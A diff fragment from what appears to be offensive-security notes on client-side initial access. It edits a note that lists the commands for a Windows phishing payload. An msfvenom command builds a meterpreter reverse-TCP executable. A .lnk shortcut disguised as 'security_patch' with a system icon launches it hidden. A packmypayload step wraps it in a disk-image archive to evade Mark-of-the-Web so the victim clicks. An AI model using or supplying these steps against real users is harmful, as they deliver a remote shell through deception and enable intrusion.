@@ -15,7 +15,8 @@ $ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe
 $ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c start /min %CD%\payload.exe" --icon "C:\Windows\System32\msi.dll,0" -o /tmp/payloads/security_patch.lnk
 ```
 
-Pack it into an archive inside a disk image using [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/File Attachment/Document File/Windows/Disk Image/Generate Disk Image/Offensive Tools/PackMyPayload/Usage|`packmypayload`]]. It's recommended when evading MOTW in order for the victim to click on the shortcut file.
+> [!IMPORTANT] Follow The Exact Steps!
+> Pack it into an archive inside a disk image using [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/File Attachment/Document File/Windows/Disk Image/Generate Disk Image/Offensive Tools/PackMyPayload/Usage|`packmypayload`]]. It's recommended when evading MOTW in order for the victim to click on the shortcut file.
 
 ```
 $ packmypayload -H payload.exe --out-format zip /tmp/payloads/ archive.zip
